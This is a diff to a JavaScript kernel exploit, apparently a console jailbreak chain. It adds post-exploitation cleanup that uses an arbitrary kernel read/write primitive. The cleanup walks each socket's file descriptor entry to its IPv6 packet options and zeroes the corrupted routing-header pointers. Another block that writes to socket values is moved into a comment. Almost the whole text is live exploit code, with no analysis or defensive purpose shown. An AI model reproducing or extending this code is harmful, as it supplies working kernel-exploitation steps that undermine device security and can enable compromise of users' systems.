@@ -1480,7 +1480,37 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
      log('corrupt pointers cleaned');
 
 
+   var  SIZEOF_OFILES = 0x8;
+   var SO_PCB        = 0x18;
+   var  INPCB_PKTOPTS = 0x118;
+    
+function get_fd_data_addr(sock) {
+ 
+  const filedescent_addr = ofiles.add(sock * SIZEOF_OFILES);
 
+  const file_addr = kmem.read64(filedescent_addr);
+
+  return kmem.read64(file_addr);
+}
+
+  function get_sock_pktopts(sock) {
+       const fd_data = get_fd_data_addr(sock);
+
+  const pcb = kmem.read64(fd_data.add(SO_PCB));
+  return kmem.read64(pcb.add(INPCB_PKTOPTS));
+}
+
+
+    for (let i = 0; i < sds.length; i++) {
+  const pkto = get_sock_pktopts(sds[i]);
+  kmem.write64(pkto.add(off_ip6po_rthdr), 0);
+}
+
+const reclaimPkto = get_sock_pktopts(reclaim_sock);
+kmem.write64(reclaimPkto.add(off_ip6po_rthdr), 0);
+
+kmem.write64(worker_pktopts.add(off_ip6po_rthdr), 0);
+    
 
 /*    var  SIZEOF_OFILES = 0x8;
    var SO_PCB        = 0x18;
@@ -1510,7 +1540,16 @@ for (let sd of [reclaim_sock, worker_sock, ...sds]) {
 */
     
   
-  /* const bump_fds = [
+  /*  
+  
+  
+   kmem.write32(master_sock,       0x100);
+kmem.write32(worker_sock,       0x100);
+kmem.write32(reclaim_sock,      0x100);
+    log("EXTRA CLEAN"); 
+
+  
+  const bump_fds = [
   ipv6_kernel_rw.data.master_sock,
   ipv6_kernel_rw.data.victim_sock,
   main_sock,
@@ -1537,10 +1576,6 @@ for (let sd of bump_fds) {
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
 
 
- kmem.write32(master_sock,       0x100);
-kmem.write32(worker_sock,       0x100);
-kmem.write32(reclaim_sock,      0x100);
-    log("EXTRA CLEAN"); 
 
 
  /*   for (let i = 0; i < sds.length; i++) {
